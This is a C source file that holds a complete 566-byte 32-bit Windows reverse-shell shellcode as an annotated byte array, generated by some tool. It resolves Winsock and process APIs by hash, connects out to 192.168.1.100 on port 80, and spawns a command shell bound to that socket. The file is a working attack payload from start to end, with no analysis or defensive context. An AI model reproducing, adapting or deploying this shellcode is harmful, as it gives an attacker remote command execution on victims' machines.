// Generated on 09/09/14 at 11:17:11

// Description     : 32-Bit Reverse shell using Import Address Table
// TCP Address     : 192.168.1.100:80
// Hash algorithm  : ADD/ROL
// Code size       : 566 bytes

#define API_DATA 0x16  // offset to API/DLL
#define PORT_NBR 0x20A // offset to port number
#define IP_ADDR  0x212 // offset to IP address

/* Size = 566 bytes */

char revbind[] = {
  /***************************************************************************************************/
  /* 0000 */  "\x60"                              /*  pushad                                         */
  /* 0001 */  "\xEB\x0E"                          /*  jmp 00000011h                                  */
  /* 0003 */  "\x5E"                              /*  pop esi                                        */
  /* 0004 */  "\x33\xC0"                          /*  xor eax, eax                                   */
  /* 0006 */  "\x99"                              /*  cdq                                            */
  /* 0007 */  "\xB2\x99"                          /*  mov dl, 99h                                    */
  /* 0009 */  "\xB6\x01"                          /*  mov dh, 01h                                    */
  /* 000B */  "\x03\xD6"                          /*  add edx, esi                                   */
  /* 000D */  "\xFF\xD2"                          /*  call edx                                       */
  /* 000F */  "\x61"                              /*  popad                                          */
  /* 0010 */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
  /* 0011 */  "\xE8\xED\xFF\xFF\xFF"              /*  call 00000003h                                 */
  /* 0016 */  "\x08\x6B\x65"                      /*  or byte ptr [ebx+65h], ch                      */
  /* 0019 */  "\x72\x6E"                          /*  jc 00000089h                                   */
  /* 001B */  "\x65\x6C"                          /*  insb                                           */
  /* 001D */  "\x33\x32"                          /*  xor esi, dword ptr [edx]                       */
  /* 001F */  "\x04\x0C"                          /*  add al, 0Ch                                    */
  /* 0021 */  "\x4C"                              /*  dec esp                                        */
  /* 0022 */  "\x6F"                              /*  outsd                                          */
  /* 0023 */  "\x61"                              /*  popad                                          */
  /* 0024 */  "\x64\x4C"                          /*  dec esp                                        */
  /* 0026 */  "\x69\x62\x72\x61\x72\x79\x41"      /*  imul esp, dword ptr [edx+72h], 41797261h       */
  /* 002D */  "\x0E"                              /*  push cs                                        */
  /* 002E */  "\x43"                              /*  inc ebx                                        */
  /* 002F */  "\x72\x65"                          /*  jc 00000096h                                   */
  /* 0031 */  "\x61"                              /*  popad                                          */
  /* 0032 */  "\x74\x65"                          /*  je 00000099h                                   */
  /* 0034 */  "\x50"                              /*  push eax                                       */
  /* 0035 */  "\x72\x6F"                          /*  jc 000000A6h                                   */
  /* 0037 */  "\x63\x65\x73"                      /*  arpl word ptr [ebp+73h], sp                    */
  /* 003A */  "\x73\x41"                          /*  jnc 0000007Dh                                  */
  /* 003C */  "\x13\x57\x61"                      /*  adc edx, dword ptr [edi+61h]                   */
  /* 003F */  "\x69\x74\x46\x6F\x72\x53\x69\x6E"  /*  imul esi, dword ptr [esi+eax*2+6Fh], 6E695372h */
  /* 0047 */  "\x67\x6C"                          /*  insb                                           */
  /* 0049 */  "\x65\x4F"                          /*  dec edi                                        */
  /* 004B */  "\x62\x6A\x65"                      /*  bound ebp, dword ptr [edx+65h]                 */
  /* 004E */  "\x63\x74\x0B\x43"                  /*  arpl word ptr [ebx+ecx+43h], si                */
  /* 0052 */  "\x6C"                              /*  insb                                           */
  /* 0053 */  "\x6F"                              /*  outsd                                          */
  /* 0054 */  "\x73\x65"                          /*  jnc 000000BBh                                  */
  /* 0056 */  "\x48"                              /*  dec eax                                        */
  /* 0057 */  "\x61"                              /*  popad                                          */
  /* 0058 */  "\x6E"                              /*  outsb                                          */
  /* 0059 */  "\x64\x6C"                          /*  insb                                           */
  /* 005B */  "\x65\x06"                          /*  push es                                        */
  /* 005D */  "\x77\x73"                          /*  jnbe 000000D2h                                 */
  /* 005F */  "\x32\x5F\x33"                      /*  xor bl, byte ptr [edi+33h]                     */
  /* 0062 */  "\x32\x04\x0A"                      /*  xor al, byte ptr [edx+ecx]                     */
  /* 0065 */  "\x57"                              /*  push edi                                       */
  /* 0066 */  "\x53"                              /*  push ebx                                       */
  /* 0067 */  "\x41"                              /*  inc ecx                                        */
  /* 0068 */  "\x53"                              /*  push ebx                                       */
  /* 0069 */  "\x74\x61"                          /*  je 000000CCh                                   */
  /* 006B */  "\x72\x74"                          /*  jc 000000E1h                                   */
  /* 006D */  "\x75\x70"                          /*  jne 000000DFh                                  */
  /* 006F */  "\x0A\x57\x53"                      /*  or dl, byte ptr [edi+53h]                      */
  /* 0072 */  "\x41"                              /*  inc ecx                                        */
  /* 0073 */  "\x53"                              /*  push ebx                                       */
  /* 0074 */  "\x6F"                              /*  outsd                                          */
  /* 0075 */  "\x63\x6B\x65"                      /*  arpl word ptr [ebx+65h], bp                    */
  /* 0078 */  "\x74\x41"                          /*  je 000000BBh                                   */
  /* 007A */  "\x07"                              /*  pop es                                         */
  /* 007B */  "\x63\x6F\x6E"                      /*  arpl word ptr [edi+6Eh], bp                    */
  /* 007E */  "\x6E"                              /*  outsb                                          */
  /* 007F */  "\x65\x63\x74\x0B\x63"              /*  arpl word ptr [ebx+ecx+63h], si                */
  /* 0084 */  "\x6C"                              /*  insb                                           */
  /* 0085 */  "\x6F"                              /*  outsd                                          */
  /* 0086 */  "\x73\x65"                          /*  jnc 000000EDh                                  */
  /* 0088 */  "\x73\x6F"                          /*  jnc 000000F9h                                  */
  /* 008A */  "\x63\x6B\x65"                      /*  arpl word ptr [ebx+65h], bp                    */
  /* 008D */  "\x74\x60"                          /*  je 000000EFh                                   */
  /* 008F */  "\x96"                              /*  xchg eax, esi                                  */
  /* 0090 */  "\x33\xC0"                          /*  xor eax, eax                                   */
  /* 0092 */  "\x99"                              /*  cdq                                            */
  /* 0093 */  "\xAC"                              /*  lodsb                                          */
  /* 0094 */  "\x03\xD0"                          /*  add edx, eax                                   */
  /* 0096 */  "\xC1\xC2\x09"                      /*  rol edx, 09h                                   */
  /* 0099 */  "\x48"                              /*  dec eax                                        */
  /* 009A */  "\x79\xF7"                          /*  jns 00000093h                                  */
  /* 009C */  "\x89\x54\x24\x1C"                  /*  mov dword ptr [esp+1Ch], edx                   */
  /* 00A0 */  "\x61"                              /*  popad                                          */
  /* 00A1 */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
  /* 00A2 */  "\x60"                              /*  pushad                                         */
  /* 00A3 */  "\x8B\x43\x3C"                      /*  mov eax, dword ptr [ebx+3Ch]                   */
  /* 00A6 */  "\x83\xC0\x08"                      /*  add eax, 08h                                   */
  /* 00A9 */  "\x8B\x44\x18\x78"                  /*  mov eax, dword ptr [eax+ebx+78h]               */
  /* 00AD */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 00AF */  "\x74\x33"                          /*  je 000000E4h                                   */
  /* 00B1 */  "\x8D\x2C\x03"                      /*  lea ebp, dword ptr [ebx+eax]                   */
  /* 00B4 */  "\x8B\xF5"                          /*  mov esi, ebp                                   */
  /* 00B6 */  "\xAD"                              /*  lodsd                                          */
  /* 00B7 */  "\x92"                              /*  xchg eax, edx                                  */
  /* 00B8 */  "\xAD"                              /*  lodsd                                          */
  /* 00B9 */  "\xAD"                              /*  lodsd                                          */
  /* 00BA */  "\xAD"                              /*  lodsd                                          */
  /* 00BB */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 00BD */  "\x74\x25"                          /*  je 000000E4h                                   */
  /* 00BF */  "\xAD"                              /*  lodsd                                          */
  /* 00C0 */  "\x8B\xEE"                          /*  mov ebp, esi                                   */
  /* 00C2 */  "\x8D\x34\x13"                      /*  lea esi, dword ptr [ebx+edx]                   */
  /* 00C5 */  "\x8D\x3C\x03"                      /*  lea edi, dword ptr [ebx+eax]                   */
  /* 00C8 */  "\xAD"                              /*  lodsd                                          */
  /* 00C9 */  "\xAF"                              /*  scasd                                          */
  /* 00CA */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 00CC */  "\x74\xE6"                          /*  je 000000B4h                                   */
  /* 00CE */  "\x99"                              /*  cdq                                            */
  /* 00CF */  "\x42"                              /*  inc edx                                        */
  /* 00D0 */  "\x74\xF6"                          /*  je 000000C8h                                   */
  /* 00D2 */  "\x8D\x44\x03\x02"                  /*  lea eax, dword ptr [ebx+eax+02h]               */
  /* 00D6 */  "\xE8\xB3\xFF\xFF\xFF"              /*  call 0000008Eh                                 */
  /* 00DB */  "\x39\x44\x24\x1C"                  /*  cmp dword ptr [esp+1Ch], eax                   */
  /* 00DF */  "\x75\xE7"                          /*  jne 000000C8h                                  */
  /* 00E1 */  "\x8B\x47\xFC"                      /*  mov eax, dword ptr [edi-04h]                   */
  /* 00E4 */  "\x89\x44\x24\x1C"                  /*  mov dword ptr [esp+1Ch], eax                   */
  /* 00E8 */  "\x61"                              /*  popad                                          */
  /* 00E9 */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
  /* 00EA */  "\x60"                              /*  pushad                                         */
  /* 00EB */  "\x6A\x30"                          /*  push 00000030h                                 */
  /* 00ED */  "\x59"                              /*  pop ecx                                        */
  /* 00EE */  "\x64\x8B\x01"                      /*  mov eax, dword ptr fs:[ecx]                    */
  /* 00F1 */  "\x8B\x40\x0C"                      /*  mov eax, dword ptr [eax+0Ch]                   */
  /* 00F4 */  "\x8B\x78\x1C"                      /*  mov edi, dword ptr [eax+1Ch]                   */
  /* 00F7 */  "\xEB\x0F"                          /*  jmp 00000108h                                  */
  /* 00F9 */  "\x8B\x44\x24\x1C"                  /*  mov eax, dword ptr [esp+1Ch]                   */
  /* 00FD */  "\xE8\xA0\xFF\xFF\xFF"              /*  call 000000A2h                                 */
  /* 0102 */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 0104 */  "\x75\x09"                          /*  jne 0000010Fh                                  */
  /* 0106 */  "\x8B\x3F"                          /*  mov edi, dword ptr [edi]                       */
  /* 0108 */  "\x8B\x5F\x08"                      /*  mov ebx, dword ptr [edi+08h]                   */
  /* 010B */  "\x85\xDB"                          /*  test ebx, ebx                                  */
  /* 010D */  "\x75\xEA"                          /*  jne 000000F9h                                  */
  /* 010F */  "\x89\x44\x24\x1C"                  /*  mov dword ptr [esp+1Ch], eax                   */
  /* 0113 */  "\x61"                              /*  popad                                          */
  /* 0114 */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
  /* 0115 */  "\x60"                              /*  pushad                                         */
  /* 0116 */  "\x33\xC0"                          /*  xor eax, eax                                   */
  /* 0118 */  "\xAC"                              /*  lodsb                                          */
  /* 0119 */  "\x91"                              /*  xchg eax, ecx                                  */
  /* 011A */  "\xF3\xA4"                          /*  rep movsb                                      */
  /* 011C */  "\x91"                              /*  xchg eax, ecx                                  */
  /* 011D */  "\xAA"                              /*  stosb                                          */
  /* 011E */  "\x89\x74\x24\x04"                  /*  mov dword ptr [esp+04h], esi                   */
  /* 0122 */  "\x61"                              /*  popad                                          */
  /* 0123 */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
  /* 0124 */  "\xB8\xB0\xAE\x25\xBE"              /*  mov eax, BE25AEB0h                             */
  /* 0129 */  "\xE8\xBC\xFF\xFF\xFF"              /*  call 000000EAh                                 */
  /* 012E */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 0130 */  "\x74\x32"                          /*  je 00000164h                                   */
  /* 0132 */  "\x93"                              /*  xchg eax, ebx                                  */
  /* 0133 */  "\xB8\xB1\x4C\xA6\x51"              /*  mov eax, 51A64CB1h                             */
  /* 0138 */  "\xE8\xAD\xFF\xFF\xFF"              /*  call 000000EAh                                 */
  /* 013D */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 013F */  "\x74\x23"                          /*  je 00000164h                                   */
  /* 0141 */  "\xE8\xCF\xFF\xFF\xFF"              /*  call 00000115h                                 */
  /* 0146 */  "\x57"                              /*  push edi                                       */
  /* 0147 */  "\xFF\xD0"                          /*  call eax                                       */
  /* 0149 */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 014B */  "\x74\x17"                          /*  je 00000164h                                   */
  /* 014D */  "\x95"                              /*  xchg eax, ebp                                  */
  /* 014E */  "\x33\xC0"                          /*  xor eax, eax                                   */
  /* 0150 */  "\xAC"                              /*  lodsb                                          */
  /* 0151 */  "\x91"                              /*  xchg eax, ecx                                  */
  /* 0152 */  "\xE8\xBE\xFF\xFF\xFF"              /*  call 00000115h                                 */
  /* 0157 */  "\x51"                              /*  push ecx                                       */
  /* 0158 */  "\x57"                              /*  push edi                                       */
  /* 0159 */  "\x55"                              /*  push ebp                                       */
  /* 015A */  "\xFF\xD3"                          /*  call ebx                                       */
  /* 015C */  "\x59"                              /*  pop ecx                                        */
  /* 015D */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 015F */  "\x74\x03"                          /*  je 00000164h                                   */
  /* 0161 */  "\xAB"                              /*  stosd                                          */
  /* 0162 */  "\xE2\xEE"                          /*  loop 00000152h                                 */
  /* 0164 */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
  /* 0165 */  "\x60"                              /*  pushad                                         */
  /* 0166 */  "\x99"                              /*  cdq                                            */
  /* 0167 */  "\x8D\x7B\x20"                      /*  lea edi, dword ptr [ebx+20h]                   */
  /* 016A */  "\x8B\xF7"                          /*  mov esi, edi                                   */
  /* 016C */  "\x6A\x44"                          /*  push 00000044h                                 */
  /* 016E */  "\x8F\x07"                          /*  pop dword ptr [edi]                            */
  /* 0170 */  "\xFF\x47\x2D"                      /*  inc dword ptr [edi+2Dh]                        */
  /* 0173 */  "\x8D\x7F\x38"                      /*  lea edi, dword ptr [edi+38h]                   */
  /* 0176 */  "\xAB"                              /*  stosd                                          */
  /* 0177 */  "\xAB"                              /*  stosd                                          */
  /* 0178 */  "\xAB"                              /*  stosd                                          */
  /* 0179 */  "\x95"                              /*  xchg eax, ebp                                  */
  /* 017A */  "\x8B\xFB"                          /*  mov edi, ebx                                   */
  /* 017C */  "\xB8\x9C\x92\x9B\xFF"              /*  mov eax, FF9B929Ch                             */
  /* 0181 */  "\xF7\xD0"                          /*  not eax                                        */
  /* 0183 */  "\xAB"                              /*  stosd                                          */
  /* 0184 */  "\x56"                              /*  push esi                                       */
  /* 0185 */  "\x56"                              /*  push esi                                       */
  /* 0186 */  "\x52"                              /*  push edx                                       */
  /* 0187 */  "\x52"                              /*  push edx                                       */
  /* 0188 */  "\x68\xFF\xFF\xFF\xF7"              /*  push F7FFFFFFh                                 */
  /* 018D */  "\xF7\x14\x24"                      /*  not dword ptr [esp]                            */
  /* 0190 */  "\x57"                              /*  push edi                                       */
  /* 0191 */  "\x52"                              /*  push edx                                       */
  /* 0192 */  "\x52"                              /*  push edx                                       */
  /* 0193 */  "\x53"                              /*  push ebx                                       */
  /* 0194 */  "\x52"                              /*  push edx                                       */
  /* 0195 */  "\xFF\x53\xE4"                      /*  call dword ptr [ebx-1Ch]                       */
  /* 0198 */  "\xF7\xD8"                          /*  neg eax                                        */
  /* 019A */  "\x79\x11"                          /*  jns 000001ADh                                  */
  /* 019C */  "\x50"                              /*  push eax                                       */
  /* 019D */  "\xFF\x73\x20"                      /*  push dword ptr [ebx+20h]                       */
  /* 01A0 */  "\xFF\x53\xE8"                      /*  call dword ptr [ebx-18h]                       */
  /* 01A3 */  "\xAD"                              /*  lodsd                                          */
  /* 01A4 */  "\x50"                              /*  push eax                                       */
  /* 01A5 */  "\xFF\x53\xEC"                      /*  call dword ptr [ebx-14h]                       */
  /* 01A8 */  "\xAD"                              /*  lodsd                                          */
  /* 01A9 */  "\x50"                              /*  push eax                                       */
  /* 01AA */  "\xFF\x53\xEC"                      /*  call dword ptr [ebx-14h]                       */
  /* 01AD */  "\x61"                              /*  popad                                          */
  /* 01AE */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
  /* 01AF */  "\xB9\x74\xFF\xFF\xFF"              /*  mov ecx, FFFFFF74h                             */
  /* 01B4 */  "\xF7\xD9"                          /*  neg ecx                                        */
  /* 01B6 */  "\x2B\xE1"                          /*  sub esp, ecx                                   */
  /* 01B8 */  "\x8B\xFC"                          /*  mov edi, esp                                   */
  /* 01BA */  "\xF3\xAA"                          /*  rep stosb                                      */
  /* 01BC */  "\x8B\xFC"                          /*  mov edi, esp                                   */
  /* 01BE */  "\xE8\x61\xFF\xFF\xFF"              /*  call 00000124h                                 */
  /* 01C3 */  "\x74\x6A"                          /*  je 0000022Fh                                   */
  /* 01C5 */  "\x68\xCC\xCD\xFF\xFF"              /*  push FFFFCDCCh                                 */
  /* 01CA */  "\xF7\x14\x24"                      /*  not dword ptr [esp]                            */
  /* 01CD */  "\x68\x77\x73\x32\x5F"              /*  push 5F327377h                                 */
  /* 01D2 */  "\x8B\xC4"                          /*  mov eax, esp                                   */
  /* 01D4 */  "\x50"                              /*  push eax                                       */
  /* 01D5 */  "\xFF\x57\xF0"                      /*  call dword ptr [edi-10h]                       */
  /* 01D8 */  "\x59"                              /*  pop ecx                                        */
  /* 01D9 */  "\x59"                              /*  pop ecx                                        */
  /* 01DA */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 01DC */  "\x74\x51"                          /*  je 0000022Fh                                   */
  /* 01DE */  "\xE8\x41\xFF\xFF\xFF"              /*  call 00000124h                                 */
  /* 01E3 */  "\x74\x4A"                          /*  je 0000022Fh                                   */
  /* 01E5 */  "\x8B\xDF"                          /*  mov ebx, edi                                   */
  /* 01E7 */  "\x8B\xCC"                          /*  mov ecx, esp                                   */
  /* 01E9 */  "\x81\xC1\x01\xFE\xFF\xFF"          /*  add ecx, FFFFFE01h                             */
  /* 01EF */  "\x51"                              /*  push ecx                                       */
  /* 01F0 */  "\x6A\x02"                          /*  push 00000002h                                 */
  /* 01F2 */  "\xFF\x53\xF0"                      /*  call dword ptr [ebx-10h]                       */
  /* 01F5 */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 01F7 */  "\x75\x36"                          /*  jne 0000022Fh                                  */
  /* 01F9 */  "\x50"                              /*  push eax                                       */
  /* 01FA */  "\x50"                              /*  push eax                                       */
  /* 01FB */  "\x50"                              /*  push eax                                       */
  /* 01FC */  "\x50"                              /*  push eax                                       */
  /* 01FD */  "\x6A\x01"                          /*  push 00000001h                                 */
  /* 01FF */  "\x6A\x02"                          /*  push 00000002h                                 */
  /* 0201 */  "\xFF\x53\xF4"                      /*  call dword ptr [ebx-0Ch]                       */
  /* 0204 */  "\x8B\xE8"                          /*  mov ebp, eax                                   */
  /* 0206 */  "\x40"                              /*  inc eax                                        */
  /* 0207 */  "\x74\x26"                          /*  je 0000022Fh                                   */
  /* 0209 */  "\xB8\xFD\xFF\xFF\xAF"              /*  mov eax, AFFFFFFDh                             */
  /* 020E */  "\xF7\xD0"                          /*  not eax                                        */
  /* 0210 */  "\xAB"                              /*  stosd                                          */
  /* 0211 */  "\xB8\x3F\x57\xFE\x9B"              /*  mov eax, 9BFE573Fh                             */
  /* 0216 */  "\xF7\xD0"                          /*  not eax                                        */
  /* 0218 */  "\xAB"                              /*  stosd                                          */
  /* 0219 */  "\x6A\x10"                          /*  push 00000010h                                 */
  /* 021B */  "\x53"                              /*  push ebx                                       */
  /* 021C */  "\x55"                              /*  push ebp                                       */
  /* 021D */  "\xFF\x53\xF8"                      /*  call dword ptr [ebx-08h]                       */
  /* 0220 */  "\x85\xC0"                          /*  test eax, eax                                  */
  /* 0222 */  "\x75\x07"                          /*  jne 0000022Bh                                  */
  /* 0224 */  "\x8B\xC5"                          /*  mov eax, ebp                                   */
  /* 0226 */  "\xE8\x3A\xFF\xFF\xFF"              /*  call 00000165h                                 */
  /* 022B */  "\x55"                              /*  push ebp                                       */
  /* 022C */  "\xFF\x53\xFC"                      /*  call dword ptr [ebx-04h]                       */
  /* 022F */  "\x81\xEC\x74\xFF\xFF\xFF"          /*  sub esp, FFFFFF74h                             */
  /* 0235 */  "\xC3"                              /*  ret                                            */
  /***************************************************************************************************/
};
